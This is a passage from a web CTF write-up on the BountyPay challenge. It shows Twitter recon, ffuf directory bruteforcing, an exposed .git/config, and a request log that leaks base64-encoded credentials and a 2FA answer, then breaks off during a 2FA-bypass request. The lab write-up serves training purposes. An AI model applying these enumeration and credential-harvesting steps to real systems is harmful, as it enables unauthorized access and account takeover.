<p>You might be wondering what are those orange stripes in the screenshot, this is because I'm using <a href="https://github.com/nccgroup/autochrome">autochrome</a> a great tool which downloads, installs, and configures a shiny new copy of Chromium for pentesting. If you haven't already I encourage you to check it out ! If you are more a Firefox kind of person then <a href="https://twitter.com/BitK_">BitK</a> just released basically the same tool for Firefox named <a href="https://github.com/B-i-t-K/PwnFox">PwnFox</a>.</p>
</div>
<p>The other interesting thing we can note is that there is a reference to a Twitter account in the source of the page:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;position:absolute;bottom:7px;right:7px&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;pull-right&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;https://twitter.com/bountypayhq&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;twitter-follow-button pull-right&quot;</span> <span class="na">data-show-count</span><span class="o">=</span><span class="s">&quot;false&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">async</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://platform.twitter.com/widgets.js&quot;</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="twitter">Twitter<a class="headerlink" href="#twitter" title="Permanent link">&para;</a></h3>
<p>On <a href="https://twitter.com/bountypayhq">@BountypayHQ</a> profile page there are only 3 tweets including one with a reference to a new employee named Sandra:</p>
<p><img alt="https://twitter.com/bountypayhq" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2009.50.13.png" /></p>
<p>BountyPayHQ is only following 3 accounts and we can see that among them, is the new employee <a href="https://twitter.com/SandraA76708114">SandraA76708114</a> aka Sandra Allison:</p>
<p><img alt="https://twitter.com/BountypayHQ/following" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2013.21.50.png" /></p>
<p>If we look at her profile there is only <a href="https://twitter.com/SandraA76708114/status/1258693001964068864">1 tweet</a> with a photo including what appears to be her employee ID: <code>STF:8FJ3KFISL3</code> which will be useful later on:</p>
<p><img alt="https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2013.23.06.png" /></p>
<h3 id="appbountypayh1ctfcom">app.bountypay.h1ctf.com<a class="headerlink" href="#appbountypayh1ctfcom" title="Permanent link">&para;</a></h3>
<p><img alt="app.bountypay.h1ctf.com" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2009.12.39.png" /></p>
<p>On app.bountypay.h1ctf.com at first sight there is not much to see, there is only a login form which gives su an error when submitting invalid credentials.</p>
<h3 id="apibountypayh1ctfcom">api.bountypay.h1ctf.com<a class="headerlink" href="#apibountypayh1ctfcom" title="Permanent link">&para;</a></h3>
<p><img alt="api.bountypay.h1ctf.com" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2009.14.01.png" /></p>
<p>On the api the only thing out of the ordinary is a link that redirects to Google Search, we will come back to this later on.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/redirect?url=https://www.google.com/search?q=REST+API&quot;</span><span class="p">&gt;</span>REST API<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="staffbountypayh1ctfcom">staff.bountypay.h1ctf.com<a class="headerlink" href="#staffbountypayh1ctfcom" title="Permanent link">&para;</a></h3>
<p><img alt="staff.bountypay.h1ctf.com" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2009.14.52.png" /></p>
<p>The staff application looks really similar to the app one. We are presented with a login form which throws an error with invalid credentials. Something we can note is the <code>template</code> parameter in the URL used to load the login template.</p>
<h3 id="softwarebountypayh1ctfcom">software.bountypay.h1ctf.com<a class="headerlink" href="#softwarebountypayh1ctfcom" title="Permanent link">&para;</a></h3>
<p><img alt="software.bountypay.h1ctf.com" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2009.16.58.png" /></p>
<p>The software subdomain appear to be only accessible from a specific IP.</p>
<h2 id="active-reconnaissance">Active Reconnaissance<a class="headerlink" href="#active-reconnaissance" title="Permanent link">&para;</a></h2>
<h3 id="directory-enumeration">Directory Enumeration<a class="headerlink" href="#directory-enumeration" title="Permanent link">&para;</a></h3>
<p>After the passive reconnaiscance I usually do some directory and file bruteforcing. My goto tool for this now is <a href="https://github.com/ffuf/ffuf">ffuf</a>. FFuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ffuf -w raft-large-directories.txt \
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>-o ffuf-directories-app.json \
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>-u https://app.bountypay.h1ctf.com/FUZZ/ \
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>-t 10 \
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>-replay-proxy http://127.0.0.1:8080
</code></pre></div>
<p>ffuf output:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>________________________________________________
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a> :: Method           : GET
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a> :: URL              : https://app.bountypay.h1ctf.com/FUZZ/
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a> :: Output file      : ffuf-directories-app.json
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a> :: File format      : json
<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a> :: Follow redirects : false
<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a> :: Calibration      : false
<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a> :: ReplayProxy      : http://127.0.0.1:8080
<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a> :: Timeout          : 10
<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a> :: Threads          : 10
<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a> :: Matcher          : Response status: 200,204,301,302,307,401,403
<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>________________________________________________
<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>
<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>images                  [Status: 403, Size: 178, Words: 5, Lines: 8]
<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>js                      [Status: 403, Size: 178, Words: 5, Lines: 8]
<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>css                     [Status: 403, Size: 178, Words: 5, Lines: 8]
<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>cgit                    [Status: 403, Size: 170, Words: 5, Lines: 7]
<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>:: Progress: [62275/62275] :: Job [1/1] :: 80 req/sec :: Duration: [0:12:54] :: Errors: 3 ::
</code></pre></div>
<p>There is one entry that looks interesting <code>cgit</code>, which might indicate that we are in the presence of a misconfigured NGINX web server with a <code>.git</code> folder that is publicly available. Let's see if we can access the config file. This request was made inside Burp but I'll use <a href="https://httpie.org/">HTTPie</a> output for the writeup since it will make the report easier to read:&#x20;</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>http get https://app.bountypay.h1ctf.com/.git/config
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/octet-stream</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 16:41:44 GMT</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>[core]
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>    repositoryformatversion = 0
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>    filemode = true
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>    bare = false
<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>    logallrefupdates = true
<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>[remote &quot;origin&quot;]
<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>    url = https://github.com/bounty-pay-code/request-logger.git
<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>    fetch = +refs/heads/*:refs/remotes/origin/*
<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>[branch &quot;master&quot;]
<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>    remote = origin
<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>    merge = refs/heads/master
</code></pre></div>
<p>Bingo ! The config file gives us the URL of the <a href="https://github.com/bounty-pay-code/request-logger">repository</a>.&#x20;</p>
<h3 id="souce-code-analysis">Souce code analysis<a class="headerlink" href="#souce-code-analysis" title="Permanent link">&para;</a></h3>
<p><img alt="https://github.com/bounty-pay-code/" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2018.46.28.png" /></p>
<p>The GitHub <a href="https://github.com/bounty-pay-code">account</a> has only one repository with one <a href="https://github.com/bounty-pay-code/request-logger/blob/master/logger.php">file</a> and one <a href="https://github.com/bounty-pay-code/request-logger/commits/master">commit</a>. We can see that the PHP file is logging request data into a file named <code>bp_web_trace.log</code>.</p>
<div class="highlight"><span class="filename">logger.php</span><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>  <span class="s1">&#39;IP&#39;</span>        <span class="o">=&gt;</span>  <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">],</span>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>  <span class="s1">&#39;URI&#39;</span>       <span class="o">=&gt;</span>  <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_URI&quot;</span><span class="p">],</span>
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>  <span class="s1">&#39;METHOD&#39;</span>    <span class="o">=&gt;</span>  <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">],</span>
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>  <span class="s1">&#39;PARAMS&#39;</span>    <span class="o">=&gt;</span>  <span class="k">array</span><span class="p">(</span>
<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>      <span class="s1">&#39;GET&#39;</span>   <span class="o">=&gt;</span>  <span class="nv">$_GET</span><span class="p">,</span>
<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>      <span class="s1">&#39;POST&#39;</span>  <span class="o">=&gt;</span>  <span class="nv">$_POST</span>
<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>  <span class="p">)</span>
<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="p">);</span>
<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="nb">file_put_contents</span><span class="p">(</span>
<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>  <span class="s1">&#39;bp_web_trace.log&#39;</span><span class="p">,</span>
<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>  <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;U&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>  <span class="nx">FILE_APPEND</span>
<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="p">);</span>
</code></pre></div>
<p>Let's see if the file is available on the server.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>http get https://app.bountypay.h1ctf.com/bp_web_trace.log
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/octet-stream</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 16:46:48 GMT</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
</code></pre></div>
<p>We can easily decode the base64 encoded data, I'm either using <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a> inside of Burp or <a href="https://gchq.github.io/CyberChef/">CyberChef</a> for this kind of thing:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">{</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">    </span><span class="nt">&quot;IP&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.1.1&quot;</span><span class="p">,</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">    </span><span class="nt">&quot;METHOD&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="nt">&quot;PARAMS&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">        </span><span class="nt">&quot;GET&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">        </span><span class="nt">&quot;POST&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">    </span><span class="nt">&quot;URI&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/&quot;</span>
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="p">}</span>
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="p">{</span>
<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">    </span><span class="nt">&quot;IP&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.1.1&quot;</span><span class="p">,</span>
<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">    </span><span class="nt">&quot;METHOD&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;POST&quot;</span><span class="p">,</span>
<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">    </span><span class="nt">&quot;PARAMS&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">        </span><span class="nt">&quot;GET&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="w">        </span><span class="nt">&quot;POST&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">            </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;V7h0inzX&quot;</span><span class="p">,</span>
<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">            </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;brian.oliver&quot;</span>
<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="w">    </span><span class="nt">&quot;URI&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/&quot;</span>
<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="p">}</span>
<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="p">{</span>
<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="w">    </span><span class="nt">&quot;IP&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.1.1&quot;</span><span class="p">,</span>
<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a><span class="w">    </span><span class="nt">&quot;METHOD&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;POST&quot;</span><span class="p">,</span>
<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="w">    </span><span class="nt">&quot;PARAMS&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="w">        </span><span class="nt">&quot;GET&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="w">        </span><span class="nt">&quot;POST&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="w">            </span><span class="nt">&quot;challenge_answer&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;bD83Jk27dQ&quot;</span><span class="p">,</span>
<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="w">            </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;V7h0inzX&quot;</span><span class="p">,</span>
<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a><span class="w">            </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;brian.oliver&quot;</span>
<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="w">    </span><span class="nt">&quot;URI&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/&quot;</span>
<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="p">}</span>
<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="p">{</span>
<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a><span class="w">    </span><span class="nt">&quot;IP&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.1.1&quot;</span><span class="p">,</span>
<a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="w">    </span><span class="nt">&quot;METHOD&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span>
<a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="w">    </span><span class="nt">&quot;PARAMS&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="w">        </span><span class="nt">&quot;GET&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a><span class="w">            </span><span class="nt">&quot;month&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;04&quot;</span><span class="p">,</span>
<a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a><span class="w">            </span><span class="nt">&quot;year&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2020&quot;</span>
<a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a><span class="w">        </span><span class="p">},</span>
<a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a><span class="w">        </span><span class="nt">&quot;POST&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
<a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a><span class="w">    </span><span class="nt">&quot;URI&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/statements&quot;</span>
<a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a><span class="p">}</span>
</code></pre></div>
<p>The most interesting one is the third where we can see a username, password and 2FA challenge answer. If we try to login using the credentials found in the log file we get asked for a 10 characters password sent to the user's phone:</p>
<p><img alt="BountyPay - Login 2FA" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2019.10.39.png" /></p>
<p>The code found in the log file is invalid and bruteforcing the code is usually not the way to go in CTFs.&#x20;</p>
<h3 id="bypassing-2fa">Bypassing 2FA<a class="headerlink" href="#bypassing-2fa" title="Permanent link">&para;</a></h3>
<p>Let's analyze the request being sent when submitting the challlenge answer:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">app.bountypay.h1ctf.com</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">108</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">https://app.bountypay.h1ctf.com</span>
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/orange</span>
<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
